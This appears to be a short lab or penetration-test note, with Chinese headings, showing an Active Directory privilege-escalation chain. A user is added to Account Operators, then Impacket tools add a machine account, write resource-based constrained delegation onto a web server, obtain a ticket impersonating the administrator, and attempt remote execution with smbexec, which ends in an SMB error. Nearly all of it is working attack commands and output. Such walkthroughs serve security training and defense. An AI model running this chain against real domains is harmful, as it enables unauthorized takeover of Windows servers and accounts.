
将账户添加至 `Account Operators`

```shell
C:\Users\Administrator\Desktop>net localgroup "Account Operators" h0ny /add /domain
命令成功完成。


C:\Users\Administrator\Desktop>net localgroup "Account Operators" /domain
别名     Account Operators
注释     成员可以管理域用户和组帐户

成员

-------------------------------------------------------------------------------
h0ny
命令成功完成。
```


```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-addcomputer 't1sts.com/h0ny:hony@yyd4' -computer-name 'Test$' -computer-pass 'Admin@123' -dc-ip 192.168.130.3
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account Test$ with password Admin@123.
                                                                                                                      
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-rbcd 't1sts.com/h0ny:hony@yyd4' -action write -delegate-from 'Test$' -delegate-to 'WEB$' -dc-ip 192.168.130.3
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] Test$ can now impersonate users on WEB$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     Test$        (S-1-5-21-2484573369-1704761021-599324875-2102)
                                                                                                                      
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-getST t1sts.com/Test$:'Admin@123' -spn cifs/WEB.t1sts.com -impersonate administrator -dc-ip 192.168.130.3 
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
                                                                                                                      
┌──(kali㉿kali)-[~/Desktop]
└─$ export KRB5CCNAME=administrator.ccache
                                                                                                                      
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-smbexec 't1sts.com/administrator@WEB.t1sts.com' -target-ip 192.168.130.4 -codec gbk -shell-type powershell -no-pass -k
Impacket v0.11.0 - Copyright 2023 Fortra

[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)
```